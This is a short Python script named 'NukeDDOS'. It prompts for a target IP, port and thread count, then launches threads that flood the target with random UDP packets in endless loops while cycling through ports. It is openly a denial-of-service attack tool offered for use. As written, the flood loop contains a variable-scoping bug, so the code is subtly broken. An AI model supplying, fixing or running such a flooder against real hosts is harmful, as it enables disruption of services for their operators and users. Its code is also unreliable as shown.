import sys
import os
import time
import socket
import random
import threading
from datetime import datetime
from colorama import Fore, Back, Style, init

init(autoreset=True)

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet -f slant 'NukeDDOS'")
print(Fore.MAGENTA + Style.BRIGHT + "NukeDDOS")

print(Fore.MAGENTA + "Author   : Laila19")
print(Fore.MAGENTA + "GitHub   : https://github.com/lailacypher")
print()

ip = input("Target IP: ")
port = int(input("Port: "))
threads = int(input("Number of Threads: "))

def attack():
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port = port + 1
        print(f"{Fore.MAGENTA}Sent {sent} packet(s) to {ip} through port: {port}")
        
        if port == 65534:
            port = 1

os.system("clear")
os.system("figlet -f slant 'Attack Starting'")
print(Fore.MAGENTA + "Starting the attack...")

time.sleep(2)
for _ in range(threads):
    t = threading.Thread(target=attack)
    t.start()
